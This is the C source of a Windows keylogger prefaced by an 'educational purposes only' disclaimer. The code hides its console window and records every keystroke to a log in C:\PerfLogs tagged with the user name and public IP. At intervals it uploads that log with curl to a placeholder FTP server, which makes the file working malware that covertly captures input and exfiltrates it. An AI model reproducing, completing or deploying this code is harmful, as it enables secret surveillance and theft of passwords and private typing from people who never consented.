/*I am not responsible for any damage done by this keylogger, this programm is for educational purposes ONLY
  DONT USE IT WITHOUT PERMISSION */

#include <stdio.h>
#include <string.h>
#include <windows.h>

void stealth();
int save(int key, char *filename);

void stealth() {      //stealth function to hide the console and run in background
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

int save(int key, char *filename) {                          //save function that saves the keystroke into a file
    if ((key == 1) || (key == 2)) return 0;
    FILE * fileptr;
    fileptr = fopen(filename, "a+");

    switch (key) {                                              //check if the key pressed was one of these special keys 
        case 8: fprintf(fileptr, "{BACKSPACE}"); break;
        case 13: fprintf(fileptr, "{ENTER}\n"); break;
        case 32: fprintf(fileptr, " "); break;
        case VK_TAB: fprintf(fileptr, "{TAB}"); break;
        case VK_SHIFT: fprintf(fileptr, "{SHIFT}"); break;
        case VK_CONTROL: fprintf(fileptr, "{CONTROL}"); break;
        case VK_ESCAPE: fprintf(fileptr, "{ESCAPE}"); break;
        case VK_END: fprintf(fileptr, "{END}"); break;
        case VK_HOME: fprintf(fileptr, "{HOME}"); break;
        case VK_LEFT: fprintf(fileptr, "{LEFT}"); break;
        case VK_UP: fprintf(fileptr, "{UP}"); break;
        case VK_RIGHT: fprintf(fileptr, "{RIGHT}"); break;
        case VK_DOWN: fprintf(fileptr, "{DOWN}"); break;
        case 190 || 110: fprintf(fileptr, "."); break;
        default: fprintf(fileptr, "%s", &key); break;
    }
    fclose(fileptr);
    return 0;
}

int main()
{
    stealth();
    FILE *init;
    SYSTEMTIME curr;
    char path[200]="C:\\PerfLogs\\";
    char c,filename[40],sessionname[25],ip[20],cmd[1000];
    DWORD buffersize=25;
    int i=0;

    GetSystemTime(&curr);
    itoa(GetCurrentProcessId(),filename,10);
    GetUserNameA(sessionname,&buffersize);
    strcat(filename,"_");
    strcat(filename,sessionname);
    strcat(filename,".log");
    system("curl http://ip.42.pl/raw>C:\\PerfLogs\\ip.txt");
    init = fopen("C:\\PerfLogs\\ip.txt","r");
    fscanf(init,"%s",ip);
    fclose(init);
    system("del C:\\PerfLogs\\ip.txt");
    strcat(path,filename);
    init = fopen( path , "a+" );
    fprintf(init,"IP : %s\nDATE : %u/%u/%u || %u:%u \n",ip,curr.wDay,curr.wMonth,curr.wYear,curr.wHour,curr.wMinute );
    fclose(init);
    strcpy(cmd,"curl -T ");
    strcat(cmd,path);
    strcat(cmd, " ftp://username:password@domain");
    

    while (1) {
        i++;
        if (i==2000)
        {
            i=0;
            system(cmd);
        }
        Sleep(10);
        for (int c = 0; c < 255; c++) {
            if (GetAsyncKeyState(c) == -32767)
                save(c, path);
        }
    }
    return 0;
}
